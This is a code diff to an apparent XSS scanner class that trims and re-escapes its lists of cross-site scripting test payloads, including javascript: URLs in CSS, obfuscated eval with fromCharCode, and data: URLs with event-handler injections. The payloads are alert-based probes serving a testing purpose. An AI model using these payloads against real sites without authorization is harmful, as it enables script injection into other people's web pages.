@@ -295,11 +295,7 @@ class XSSScanner:
                 'url("javascript:alert(\\"XSS\\")")',
                 'url("javascript:alert(String.fromCharCode(88,83,83))")',
                 'url("javascript:eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))")',
-                'url("javascript:window[\\"alert\\"](\\"XSS\\")")',
-                'url("javascript:setTimeout(\\"alert(\\'XSS\\')\\",0)")',
-                'url("javascript:setInterval(\\"alert(\\'XSS\\')\\",1000)")',
-                'url("javascript:Function(\\"alert(\\'XSS\\')\\")()")',
-                'url("javascript:[].constructor.constructor(\\"alert(\\'XSS\\')\\")()")'
+                'url("javascript:window[\\"alert\\"](\\"XSS\\")")'
             ],
             'url': [
                 'javascript:alert("XSS")',
@@ -313,13 +309,13 @@ class XSSScanner:
                 'data:text/html,<script>alert("XSS")</script>',
                 'data:text/html,<img src=x onerror=alert("XSS")>',
                 'data:text/html,<svg onload=alert("XSS")>',
-                'data:text/html,<iframe src="javascript:alert(\\'XSS\\')">',
+                'data:text/html,<iframe src="javascript:alert(\'XSS\')">',
                 'data:text/html,<body onload=alert("XSS")>',
                 'data:text/html,<input onfocus=alert("XSS") autofocus>',
                 'data:text/html,<select onfocus=alert("XSS") autofocus><option>',
                 'data:text/html,<textarea onfocus=alert("XSS") autofocus>',
                 'data:text/html,<keygen onfocus=alert("XSS") autofocus>',
-                'data:text/html,<video><source onerror="alert(\\'XSS\\')">',
+                'data:text/html,<video><source onerror="alert(\'XSS\')">',
                 'data:text/html,<audio src=x onerror=alert("XSS")>',
                 'data:text/html,<details open ontoggle=alert("XSS")>'
             ]
